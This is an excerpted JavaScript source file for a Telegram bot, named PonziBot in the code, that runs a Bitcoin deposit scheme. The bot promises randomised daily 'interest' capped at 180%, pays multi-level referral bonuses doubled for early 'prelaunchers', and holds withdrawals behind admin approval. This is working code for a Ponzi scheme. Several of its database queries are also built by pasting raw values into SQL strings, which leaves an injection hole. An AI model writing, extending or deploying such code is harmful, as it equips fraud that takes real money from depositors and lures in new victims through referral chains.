...
var TIME_DELAY = 24; // delay in hours before beginning to pay interest
var MAX_PROFIT = 1.8; // means that the maximum amount of bonus is 180%
...
var MIN_INTEREST_RATE = 0.03;
var MAX_INTEREST_RATE = 0.06;
var MIN_DEPOSIT = 0.02; // minimum amount needed for deposit to count (in btc)
var MIN_WITHDRAWAL = 0.02; // minimum amount needed to withdraw (in btc)

// these people get double referral bonuses for being the first 25 non-admin users
var NO_PRELAUNCHERS = 25;

///// end of config

// setup

var btc_client = blocktrail.BlocktrailSDK(blocktrail_opts);
var webhook_url;
var BASE_BLOCK_INFO_URL = (TESTNET ? 'https://www.blocktrail.com/tBTC/tx/' : 'https://blockchain.info/tx/');

var bot = new TelegramBot(TELE_TOKEN, 
    {
      webHook: {
...
webhook_url = process.env.APP_URL || HEROKU_URL;


var validate_network_type = (TESTNET ? 'testnet':'prod');
...
function PonziBot(bot, sql_client, wallet_info) {
    // savedata
    var self = this;
    this.bot = bot;
    ...
    btc_client.initWallet(WALLET_NAME, WALLET_PASS, function(err, wallet) {
        if (err) {
            console.log(err);
        } else {
            self.wallet = wallet;
            ...
            self.lookup_user_info(user_id, 'username', function(do_u_exist){
                ...
                if (!(do_u_exist)){
                    ...
                    self.ask_sql('SELECT COUNT(*) FROM user_info', function(res){
                        ...
                        var prelaunch = (total_user_count <= (NO_PRELAUNCHERS + ADMIN_LIST.length));
                        if (referral_id){
    ...
    this.main_menu_resp = function(user_id, l_key){
        if (ADMIN_LIST.includes(user_id)){
   ...
   // faq 
        ...
        self.lookup_user_lang(user_id, function(l_key){
            ...
            self.lookup_user_info(user_id, 'prelaunch', function(prelauncher){
                ...
                self.bot.sendMessage(user_id, r_msg).then(function(msg){
                    ...
                    aff_link_msg += 'https://telegram.me/' + BOT_USERNAME + '?start=' + user_id;
    ...
    this.check_referral = function(referee_id, amount, who_deposited, layer){
        ...
        if (layer >= REFERRAL_BONUSES.length){
            return;
        }
        self.lookup_user_lang(referee_id, function(l_key){
            ...
            self.lookup_user_info(referee_id, 'prelaunch', function(prelauncher){
                ...
                var bonus_amt = amount * REFERRAL_BONUSES[layer];
                if (prelauncher){
                    bonus_amt *= 2;
                } 
        ...
        self.generate_interest(user_id, function(aa){
            ...
            self.ask_sql(`SELECT * FROM tx_info where requested_user=(${user_id})`, function(all_user_tx){
                ...
                self.lookup_user_lang(user_id, function(l_key){
                    ...
                    if (avail_to_withdraw < (MIN_WITHDRAWAL * 1e8)){
    ...
    this.create_admin_approval = function(user_id, user_name, withdraw_addr, request_amount){
        ...
        self.lookup_user_info(user_id, 'deposit_addr', function(addr){
            if (!(addr)){
                ...
                APPROVAL_ADMIN_LIST.forEach(function(a_id){
    ...
    this.bot.onText(/\💢\s*(.*)/, function(msg, match) {
        const user_id = msg.chat.id;
        if (DEV_ADMIN_LIST.includes(user_id)){
            // reply to this message with @ username
                    ...
                    self.ask_sql(`SELECT * FROM tx_info where recv_addr=('${recv_addr}')`, function(result){
                        ...
                        if (result.rows.length != 0){
                            for (var i = 0; i < result.rows.length; i++) {
                                ...
                                total_invested += amt;
                                if (amt >= (MIN_DEPOSIT * 1e8)){
                                    var d_t = result.rows[i]['timestamp_confirmed']
                                    if (d_t != undefined){
                                        d_t = new Date(d_t);
                                        var t_diff = (what_time_is_now - d_t) / 36e5;
                                        if (t_diff > TIME_DELAY){
                                            total_interest += amt * t_diff / TIME_DELAY * (Math.random() * (MAX_INTEREST_RATE - MIN_INTEREST_RATE) + MIN_INTEREST_RATE);
                                        }
                                    }
                                }
                            }
                        ...
                        if (total_interest >= MAX_PROFIT * total_invested){
                            total_interest = MAX_PROFIT * total_invested 
                        }
    ...
    if (webhook_url !== undefined) {
        ...
        this.bot.setWebHook(`${webhook_url}/bot${TELE_TOKEN}`); 
        this.bot.openWebHook(wallet_info);
    }

}

// run it
var pwnBot = new PonziBot(bot, sql_client, {url: HEROKU_URL, block_opts: blocktrail_opts, w_name: WALLET_NAME, w_pass: WALLET_PASS});
